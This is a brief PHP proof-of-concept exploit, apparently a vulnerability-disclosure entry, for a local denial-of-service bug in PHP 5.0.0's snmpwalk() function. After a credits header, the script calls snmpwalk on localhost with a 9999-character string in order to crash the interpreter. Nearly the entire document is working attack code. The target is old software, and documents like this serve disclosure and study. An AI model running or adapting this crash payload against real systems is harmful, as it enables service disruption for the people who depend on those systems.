<?php
#############################################################################
## PHP 5.0.0 snmpwalk() Local Denial of Service
## Tested on Windows Server 2012 R2 64bit, English, PHP 5.0.0
## Download @ http://museum.php.net/php5/php-5.0.0-Win32.zip
## Date: 26/08/2016
## Local Denial of Service
## Bug discovered by Yakir Wizman (https://www.linkedin.com/in/yakirwizman)
## http://www.black-rose.ml
#############################################################################
if (!extension_loaded("snmp")) die("You need snmp extension loaded!");

$str = str_repeat('A', 9999);
snmpwalk('127.0.0.1', 'public', $str);
?>
